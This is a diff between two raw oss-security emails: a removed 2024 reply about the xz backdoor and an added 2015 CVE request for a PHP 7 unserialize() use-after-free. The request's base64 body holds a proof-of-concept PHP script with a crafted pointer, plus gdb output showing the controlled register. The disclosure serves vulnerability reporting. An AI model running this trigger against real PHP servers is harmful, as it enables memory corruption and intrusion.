@@ -1,4 +1,9 @@
-Received: (qmail 9529 invoked by uid 550); 29 Mar 2024 18:59:51 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7822" "Thursday" "13" "August" "2015" "11:35:06" "+0800" "=?utf-8?B?54mb5L+d6b6Z?=" "niubl@knownsec.com" "<tencent_7E6EC45B23A03CC660D66170@qq.com>" "136" "[oss-security] CVE request - php 7 use after free" nil nil nil "8" "2015081303:35:06" "[oss-security] CVE request - php 7 use after free" (number mark "        niubl@knowns Aug 13  136/7822  " thread-indent "\"[oss-security] CVE request - php 7 use after free\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 16053 invoked by uid 550); 13 Aug 2015 04:00:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,83 +11,167 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 26442 invoked from network); 13 Aug 2015 03:35:27 -0000
+X-QQ-GoodBg: 2
+X-QQ-SSF: 00400000000000F0
+X-QQ-FEAT: 6hgywLD7RYXxLnG0fI6GD6PYn4UnKfwusxktBgGFxI8eNGIp0pKwueUlJv2cr
+	bLbaNvekNhPIoMs6nu08/EM/ggMg5cPHZJtYKmefRBruvWwrB+zw8yszyRp+6+3B3gZaqwY
+	mbvsQodbEkZfOJPWxa4TsScDYk+AUBPe4YmwTSgAlqdF4M3w2uO609+aPPvdCkXOpTCpbem
+	0v1QZNXf4bA==
+X-QQ-BUSINESS-ORIGIN: 2
+X-Originating-IP: 106.185.179.114
+X-QQ-STYLE: 
+X-QQ-mid: bizmail67t1439436906t6995941
+Mime-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_55CC106A_0A636810_4D24616D"
+Content-Transfer-Encoding: 8Bit
+X-Priority: 3
+Message-ID: <tencent_7E6EC45B23A03CC660D66170@qq.com>
+X-QQ-MIME: TCMime 1.0 by Tencent
+X-Mailer: QQMail 2.x
+X-QQ-Mailer: QQMail 2.x
+X-QQ-SENDSIZE: 520
+X-QQ-Bgrelay: 1
+Date: Thu, 13 Aug 2015 11:35:06 +0800
+From: "=?utf-8?B?54mb5L+d6b6Z?=" <niubl@knownsec.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9488 invoked from network); 29 Mar 2024 18:59:51 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1711738782; x=1712343582; darn=lists.openwall.com;
-        h=content-transfer-encoding:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=YqQk5LnfpwA6JfmnEtzIoBVws4Tv0ZgRA8oLkEjD6/s=;
-        b=N3/VVhoZrpRPqGe99WWRffYLwp54OjBBy/reftaTAYigdN939WebPbByA8gSgkZfJQ
-         4BeXpLxH55wnl3VKUVRNgrzf4xJXcR1dj/kuByPP3XmRRG+VURP8htL0K5y3tyhU05mO
-         iHB+5QrZEgqS0HlR1DbCpuYTvcWcuKnmaM41E9KaKIRCXk+IAxmwXrvVQs1SScZhXJ6Y
-         xm/47Gxl3fEqafv8gerh/zMWHGDw84W1gH1RbPSWH7X4DZ1NNo4dFmTHlhwqbHuBIji7
-         q1h2j366CC/NdViEZVMK+Jgz/7m/hY+AXGOObN9krs/qW8drrJ1PVm5OG01t6aMeffvB
-         agGA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1711738782; x=1712343582;
-        h=content-transfer-encoding:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to;
-        bh=YqQk5LnfpwA6JfmnEtzIoBVws4Tv0ZgRA8oLkEjD6/s=;
-        b=Hojg2fXw1hN7ib0r1WUX7Lf8BpA87fytG5xXD7dVN27llqEpYmvrVhlq3I5BtrZPJI
-         HVRKJeugkJxl/74CChf7p6u5t+Di4wSX4q69lOtMDDQ2Pc1dTVskKo2dyQFgSN7yclhO
-         p6512vxI1lpcZl2jdTFPsKiHrBExBQnPZSS8k7EnLugDGh13PtcGYCE1qLmA7woi5Z/Q
-         wIhI+pwRgQISgwmxLNGfm8vq4JvFYj7d9p5IdK6f6R1zAC7c29QTBLGSCaHclcfXQFv2
-         GVhxFBCkdjnsMoVo3s/0c5Y5eTqj2NKLmSSP8cRbASjzVU9EHhgGDWTC9zyZHvGGx0o3
-         fEew==
-X-Gm-Message-State: AOJu0Yz75Ww3YizEU6r4cQA6UeIHsuPlDtfz9mTIykiaZ9GMkbl87ZkG
-	g+wHmbTR++qrVJn7vRKsLEtrY8yia80ZJJsKXJPoFnCEOHRUgJREDxrIyMJuFH4YujZm2AnzsUx
-	YE5aWmgo1nm8BxDYrdTmWsTCKkSle69iFHVT/7w==
-X-Google-Smtp-Source: AGHT+IG4ttQucWVZz4DocYHPOQCN7345d8kQPNdUTCqDL1so2COIePIcIZjZTLVNdnM/qlOvuMtVVxVr5/gLM1FsMZY=
-X-Received: by 2002:a05:6102:d8c:b0:478:37c4:b20e with SMTP id
- d12-20020a0561020d8c00b0047837c4b20emr3553830vst.20.1711738781642; Fri, 29
- Mar 2024 11:59:41 -0700 (PDT)
-MIME-Version: 1.0
-References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
-In-Reply-To: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
-From: "Alexander E. Patrakov" <patrakov@gmail.com>
-Date: Sat, 30 Mar 2024 02:59:14 +0800
-Message-ID: <CAN_LGv0CU6J+5d6RX=mDrMvAg4kf3EGi+56x+J4iW0NCFRee1g@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
- server compromise
+Subject: [oss-security] CVE request - php 7 use after free
+To: "=?utf-8?B?b3NzLXNlY3VyaXR5?=" <oss-security@lists.openwall.com>
 
-On Sat, Mar 30, 2024 at 12:09=E2=80=AFAM Andres Freund <andres@anarazel.de>=
- wrote:
-> =3D=3D Affected Systems =3D=3D
->
-> The attached de-obfuscated script is invoked first after configure, where=
- it
-> decides whether to modify the build process to inject the code.
->
-> These conditions include...
-<snip>
-> Running as part of a debian or RPM package build:
->     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" =3D "xx86_64";=
-then
+------=_NextPart_55CC106A_0A636810_4D24616D
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: base64
 
-Could you please confirm that the Arch Linux binary package was never
-actually compromised?
+RGVzY3JpcHRpb246IC0tLS0tLS0tLS0tLSB0aGUgSGFzaCB0YWJsZSBpcyBm
+dWxsLCByZXNpemUgaXQsWkVORF9IQVNIX0lGX0ZVTExfRE9fUkVTSVpFKGh0
+KSxidXQgaWYgb25lIGVsbWVudCBpcyBhbHJlYWR5IGFsbG9jYXRlIGluIHRo
+ZSBvbGQgbWVtZXJ5IGFuZCByZS1hbGxvY2F0ZSBpbiB0aGUgbmV3IG1lbXJ5
+IGFuZCB0aGUgdmFyX2hhc2ggc3RydWN0IGFsc28gZXhpc3RzIHRoZSBvbGQg
+bWVtZXJ5IGZvciB0aGUgZWxlbWVudCwgaXQgY2FuIGNhdXNlIGEgdXNlIGFm
+dGVyIGZyZWUgd2hlbiB1bnNlcmlhbGl6ZSgpIGZ1bmN0aW9uIGhhcyByL1Ig
+cmVmZXJlci4gbXkgZW5nbGlzaCBpcyBwb29yLiBpIGhvcGUgaSBjYW4gZXhw
+bGFpbiBjbGVhcmx5IHRvIHlvdS4gVGVzdCBzY3JpcHQ6IC0tLS0tLS0tLS0t
+LS0tLSA8P3BocCAkYWRkciA9IDB4NDE0MTQxNDE0MTQxNDE0MTsgJHNmID0g
+bmV3IFNvYXBGYXVsdCgnMScsICdzdHJpbmcnLCAnZGV0YWlsJywgJ2hlYWRl
+cicsJ2xpbmUnLCBzdHJfcmVwZWF0KCJBIiwyMzIpLnB0cjJzdHIoJGFkZHIp
+KTsgJG9iID0gdW5zZXJpYWxpemUoImE6Mzp7aTowOyIuc2VyaWFsaXplKCRz
+ZikuJ2k6MTtyOjEyO2k6MjtyOjEwO30nKTsgLy92YXJfZHVtcCgkb2IpOyBm
+dW5jdGlvbiBwdHIyc3RyKCRwdHIpIHsgICAgICRvdXQgPSAiIjsgICAgIGZv
+ciAoJGk9MDsgJGk8ODsgJGkrKykgeyAgICAgICAgICRvdXQgLj0gY2hyKCRw
+dHIgJiAweGZmKTsgICAgICAgICAkcHRyID4+PSA4OyAgICAgfSAgICAgcmV0
+dXJuICRvdXQ7IH0gPz4gQWN0dWFsIHJlc3VsdDogLS0tLS0tLS0tLS0tLS0g
+KGdkYikgZGlzYXNzZW1ibGUgJHJpcCDigKbigKYgICAgMHgwMDAwMDAwMDAw
+NjhjZmU1IDwrMzEwOT46CWNtcCAgICAkMHhmZmZmZmZmZmZmZmZmZmZmLCVy
+c2kgICAgMHgwMDAwMDAwMDAwNjhjZmU5IDwrMzExMz46CWplICAgICAweDY4
+YzUzOCA8cGhwX3Zhcl91bnNlcmlhbGl6ZV9leCszNzY+ICAgIDB4MDAwMDAw
+MDAwMDY4Y2ZlZiA8KzMxMTk+Ogltb3YgICAgKCVyYngpLCVyZGkgICAgMHgw
+MDAwMDAwMDAwNjhjZmYyIDwrMzEyMj46CWNhbGxxICAweDQyNzZmMyA8dmFy
+X2FjY2Vzcz4gICAgMHgwMDAwMDAwMDAwNjhjZmY3IDwrMzEyNz46CXRlc3Qg
+ICAlcmF4LCVyYXggICAgMHgwMDAwMDAwMDAwNjhjZmZhIDwrMzEzMD46CWpl
+ICAgICAweDY4YzUzOCA8cGhwX3Zhcl91bnNlcmlhbGl6ZV9leCszNzY+ICAg
+IDB4MDAwMDAwMDAwMDY4ZDAwMCA8KzMxMzY+Ogltb3YgICAgKCVyYXgpLCVy
+ZHggICAgMHgwMDAwMDAwMDAwNjhkMDAzIDwrMzEzOT46CW1vdiAgICAweDgo
+JXJheCksJWVheCAgICAweDAwMDAwMDAwMDA2OGQwMDYgPCszMTQyPjoJdGVz
+dCAgICQweDQsJWFoICAgIDB4MDAwMDAwMDAwMDY4ZDAwOSA8KzMxNDU+Oglt
+b3YgICAgJXJkeCwoJXIxNCkgICAgMHgwMDAwMDAwMDAwNjhkMDBjIDwrMzE0
+OD46CW1vdiAgICAlZWF4LDB4OCglcjE0KSAgICAweDAwMDAwMDAwMDA2OGQw
+MTAgPCszMTUyPjoJamUgICAgIDB4NjhjNjJjIDxwaHBfdmFyX3Vuc2VyaWFs
+aXplX2V4KzYyMD4gPT4gMHgwMDAwMDAwMDAwNjhkMDE2IDwrMzE1OD46CWFk
+ZGwgICAkMHgxLCglcmR4KSAgICAweDAwMDAwMDAwMDA2OGQwMTkgPCszMTYx
+PjoJbW92ICAgICQweDEsJWVheCAgICAweDAwMDAwMDAwMDA2OGQwMWUgPCsz
+MTY2PjoJam1wcSAgIDB4NjhjNTNhIDxwaHBfdmFyX3Vuc2VyaWFsaXplX2V4
+KzM3OD4gICAgMHgwMDAwMDAwMDAwNjhkMDIzIDwrMzE3MT46CW5vcGwgICAw
+eDAoJXJheCwlcmF4LDEpICAgIDB4MDAwMDAwMDAwMDY4ZDAyOCA8KzMxNzY+
+OgljbXAgICAgJDB4M2EsJWFsICAgIDB4MDAwMDAwMDAwMDY4ZDAyYSA8KzMx
+Nzg+OglqbmUgICAgMHg2OGM1MzggPHBocF92YXJfdW5zZXJpYWxpemVfZXgr
+Mzc2PiAgICAweDAwMDAwMDAwMDA2OGQwMzAgPCszMTg0PjoJY21wYiAgICQw
+eDIyLDB4MiglcjEyKSAgICAweDAwMDAwMDAwMDA2OGQwMzYgPCszMTkwPjoJ
+am5lICAgIDB4NjhjNTM4IDxwaHBfdmFyX3Vuc2VyaWFsaXplX2V4KzM3Nj4g
+ICAgMHgwMDAwMDAwMDAwNjhkMDNjIDwrMzE5Nj46CWxlYSAgICAweDg1ZTEx
+ZCglcmlwKSwlcmF4ICAgICAgICAjIDB4ZWViMTYwIDx6ZW5kX3N0YW5kYXJk
+X2NsYXNzX2RlZj4gICAgMHgwMDAwMDAwMDAwNjhkMDQzIDwrMzIwMz46CW1v
+diAgICAlcmJwLCVyc2kgICAgMHgwMDAwMDAwMDAwNjhkMDQ2IDwrMzIwNj46
+CW1vdiAgICAlcjE0LCVyZGkgICAgMHgwMDAwMDAwMDAwNjhkMDQ5IDwrMzIw
+OT46CW1vdiAgICAlcjExLDB4MTAoJXJzcCkgICAgMHgwMDAwMDAwMDAwNjhk
+MDRlIDwrMzIxND46CW1vdiAgICAoJXJheCksJXJkeCAgICAweDAwMDAwMDAw
+MDA2OGQwNTEgPCszMjE3PjoJY2FsbHEgIDB4NDI3NzNjIDxvYmplY3RfY29t
+bW9uMT4gKGdkYikgaW5mbyByZWcgcmF4ICAgICAgICAgICAgMHgxNDAwCTUx
+MjAgcmJ4ICAgICAgICAgICAgMHg3ZmZmYjJmMzdmZTAJMTQwNzM2MTk1Njkw
+NDY0IHJjeCAgICAgICAgICAgIDB4YgkxMSByZHggICAgICAgICAgICAweDQx
+NDE0MTQxNDE0MTQxNDEJNDcwMjExMTIzNDQ3NDk4Mzc0NSByc2kgICAgICAg
+ICAgICAweDkJOSByZGkgICAgICAgICAgICAweDdmN2Q2Zjg1NDgyMAkxNDAx
+NzY3MTg2NDUyODAgcmJwICAgICAgICAgICAgMHg3ZmZmYjJmMzdmZDgJMHg3
+ZmZmYjJmMzdmZDggcnNwICAgICAgICAgICAgMHg3ZmZmYjJmMzdlNDAJMHg3
+ZmZmYjJmMzdlNDAgcjggICAgICAgICAgICAgMHgwCTAgcjkgICAgICAgICAg
+ICAgMHg2NTJlYzczMWM0Ygk2OTUzMjI0MDUxNzg3IHIxMCAgICAgICAgICAg
+IDB4Nzk4MTJiCTc5NjI5MjMgcjExICAgICAgICAgICAgMHgwCTAgcjEyICAg
+ICAgICAgICAgMHg3ZjdkNmY4N2IyYjEJMTQwMTc2NzE4ODAzNjMzIHIxMyAg
+ICAgICAgICAgIDB4NzIJMTE0IHIxNCAgICAgICAgICAgIDB4N2Y3ZDZmODVi
+YTYwCTE0MDE3NjcxODY3NDUyOCByMTUgICAgICAgICAgICAweDdmN2Q2Zjg3
+YjJiMgkxNDAxNzY3MTg4MDM2MzQgcmlwICAgICAgICAgICAgMHg2OGQwMTYJ
+MHg2OGQwMTYgPHBocF92YXJfdW5zZXJpYWxpemVfZXgrMzE1OD4gZWZsYWdz
+ICAgICAgICAgMHgxMDIwMglbIElGIFJGIF0gY3MgICAgICAgICAgICAgMHgz
+Mwk1MSBzcyAgICAgICAgICAgICAweDJiCTQzIGRzICAgICAgICAgICAgIDB4
+MAkwIGVzICAgICAgICAgICAgIDB4MAkwIGZzICAgICAgICAgICAgIDB4MAkw
+IGdzICAgICAgICAgICAgIDB4MAkwIChnZGIpIGJ0ICMwICAweDAwMDAwMDAw
+MDA2OGQwMTYgaW4gcGhwX3Zhcl91bnNlcmlhbGl6ZV9leCAocnZhbD1ydmFs
+QGVudHJ5PTB4N2Y3ZDZmODViYTYwLCBwPXBAZW50cnk9MHg3ZmZmYjJmMzdm
+ZDgsIG1heD1tYXhAZW50cnk9MHg3ZjdkNmY4N2IyYjIgIiIsIHZhcl9oYXNo
+PXZhcl9oYXNoQGVudHJ5PTB4N2ZmZmIyZjM3ZmUwLCAgICAgIGNsYXNzZXM9
+Y2xhc3Nlc0BlbnRyeT0weDApIGF0IC9ob21lL2tub3duc2VjL0Rvd25sb2Fk
+cy9waHAtNy4wLjBiZXRhMi9leHQvc3RhbmRhcmQvdmFyX3Vuc2VyaWFsaXpl
+ci5jOjEyNDYgIzEgIDB4MDAwMDAwMDAwMDY4Y2QwMyBpbiBwcm9jZXNzX25l
+c3RlZF9kYXRhIChydmFsPTB4N2Y3ZDZmODViYTYwLCBvYmpwcm9wcz0wLCBl
+bGVtZW50cz0wLCBodD0weDdmN2Q2Zjg1NTM0OCwgY2xhc3Nlcz0weDAsIHZh
+cl9oYXNoPTB4N2ZmZmIyZjM3ZmUwLCBtYXg9MHg3ZjdkNmY4N2IyYjIgIiIs
+IHA9MHg3ZmZmYjJmMzdmZDgpICAgICBhdCAvaG9tZS9rbm93bnNlYy9Eb3du
+bG9hZHMvcGhwLTcuMC4wYmV0YTIvZXh0L3N0YW5kYXJkL3Zhcl91bnNlcmlh
+bGl6ZXIuYzozODkgIzIgIHBocF92YXJfdW5zZXJpYWxpemVfZXggKHJ2YWw9
+cnZhbEBlbnRyeT0weDdmN2Q2ZjgxMjE2MCwgcD1wQGVudHJ5PTB4N2ZmZmIy
+ZjM3ZmQ4LCBtYXg9MHg3ZjdkNmY4N2IyYjIgIiIsIHZhcl9oYXNoPXZhcl9o
+YXNoQGVudHJ5PTB4N2ZmZmIyZjM3ZmUwLCBjbGFzc2VzPWNsYXNzZXNAZW50
+cnk9MHgwKSAgICAgYXQgL2hvbWUva25vd25zZWMvRG93bmxvYWRzL3BocC03
+LjAuMGJldGEyL2V4dC9zdGFuZGFyZC92YXJfdW5zZXJpYWxpemVyLmM6ODcw
+ICMzICAweDAwMDAwMDAwMDA2N2YwZWQgaW4gemlmX3Vuc2VyaWFsaXplIChl
+eGVjdXRlX2RhdGE9PG9wdGltaXplZCBvdXQ+LCByZXR1cm5fdmFsdWU9MHg3
+ZjdkNmY4MTIxNjApIGF0IC9ob21lL2tub3duc2VjL0Rvd25sb2Fkcy9waHAt
+Ny4wLjBiZXRhMi9leHQvc3RhbmRhcmQvdmFyLmM6MTAzNyAjNCAgMHgwMDAw
+MDAwMDAwNzUxMGVkIGluIFpFTkRfRE9fSUNBTExfU1BFQ19IQU5ETEVSICgp
+IGF0IC9ob21lL2tub3duc2VjL0Rvd25sb2Fkcy9waHAtNy4wLjBiZXRhMi9a
+ZW5kL3plbmRfdm1fZXhlY3V0ZS5oOjU3NyAjNSAgMHgwMDAwMDAwMDAwNzQx
+MmFiIGluIGV4ZWN1dGVfZXggKGV4PTxvcHRpbWl6ZWQgb3V0PikgYXQgL2hv
+bWUva25vd25zZWMvRG93bmxvYWRzL3BocC03LjAuMGJldGEyL1plbmQvemVu
+ZF92bV9leGVjdXRlLmg6NDA2ICM2ICAweDAwMDAwMDAwMDA3OGQ4ZWYgaW4g
+emVuZF9leGVjdXRlIChvcF9hcnJheT1vcF9hcnJheUBlbnRyeT0weDdmN2Q2
+Zjg4MzAwMCwgcmV0dXJuX3ZhbHVlPXJldHVybl92YWx1ZUBlbnRyeT0weDAp
+IGF0IC9ob21lL2tub3duc2VjL0Rvd25sb2Fkcy9waHAtNy4wLjBiZXRhMi9a
+ZW5kL3plbmRfdm1fZXhlY3V0ZS5oOjQ1MCAjNyAgMHgwMDAwMDAwMDAwNzA0
+NzNlIGluIHplbmRfZXhlY3V0ZV9zY3JpcHRzICh0eXBlPXR5cGVAZW50cnk9
+OCwgcmV0dmFsPXJldHZhbEBlbnRyeT0weDAsIGZpbGVfY291bnQ9ZmlsZV9j
+b3VudEBlbnRyeT0zKSBhdCAvaG9tZS9rbm93bnNlYy9Eb3dubG9hZHMvcGhw
+LTcuMC4wYmV0YTIvWmVuZC96ZW5kLmM6MTM5OSAjOCAgMHgwMDAwMDAwMDAw
+NmE3NzEwIGluIHBocF9leGVjdXRlX3NjcmlwdCAocHJpbWFyeV9maWxlPXBy
+aW1hcnlfZmlsZUBlbnRyeT0weDdmZmZiMmYzYTUxMCkgYXQgL2hvbWUva25v
+d25zZWMvRG93bmxvYWRzL3BocC03LjAuMGJldGEyL21haW4vbWFpbi5jOjI0
+NzUgIzkgIDB4MDAwMDAwMDAwMDc4ZjE2MyBpbiBkb19jbGkgKGFyZ2M9Miwg
+YXJndj0weGZmMzlmMCkgYXQgL2hvbWUva25vd25zZWMvRG93bmxvYWRzL3Bo
+cC03LjAuMGJldGEyL3NhcGkvY2xpL3BocF9jbGkuYzo5NzEgIzEwIDB4MDAw
+MDAwMDAwMDQyYzUyMCBpbiBtYWluIChhcmdjPTIsIGFyZ3Y9MHhmZjM5ZjAp
+IGF0IC9ob21lL2tub3duc2VjL0Rvd25sb2Fkcy9waHAtNy4wLjBiZXRhMi9z
+YXBpL2NsaS9waHBfY2xpLmM6MTMzOCANCg0KDQpBIGZpeCBoYXMgYmVlbiBj
+b21taXR0ZWQ6aHR0cDovL2dpdC5waHAubmV0Lz9wPXBocC1zcmMuZ2l0O2E9
+Y29tbWl0O2g9YmU1NGViN2RiMTBjNmFhODM4Y2VmOTY5ODIyYTVhZTBmNGU2
+MDVlMw0KDQoNCi0tLS0tLS0tLS0tLS0tLS0tLQ0K5YyX5Lqs55+l6YGT5Yib
+5a6H5L+h5oGv5oqA5pyv5pyJ6ZmQ5YWs5Y+4DQrniZvkv53pvpnvvIg0MDTl
+rp7pqozlrqTvvInlnLAg5Z2A77ya5YyX5Lqs5biC5pyd6Ziz5Yy66Zic5a6J
+6KW/6Lev5pyb5LqsU09IT+S4reW/g1QzIEHluqcxNSDlsYLmgLsg5py677ya
+MDEwLTU3MDc2MTkxICAgIOS8oCAg55yf77yaMDEwLTU3MDc2MTE35omLIOac
+uu+8mjEzMzY2NDY2ODkxICAgICAg6YKuIOe8lu+8mjEwMDEwMue9kSDlnYDv
+vJp3d3cua25vd25zZWMuY29t
 
-> openssh does not directly use liblzma. However debian and several other
-> distributions patch openssh to support systemd notification, and libsyste=
-md
-> does depend on lzma.
+------=_NextPart_55CC106A_0A636810_4D24616D--
 
-<snip>
 
-> Observed requirements for the exploit:
-> b) argv[0] needs to be /usr/sbin/sshd
 
-I have checked, and found that Arch Linux does not apply any patches
-when building OpenSSH.
-
-P.S. in the detect.sh script, the "set -eu" line plays a bad trick: it
-aborts the check if sshd is not actually linked to liblzma.
-
---=20
-Alexander E. Patrakov
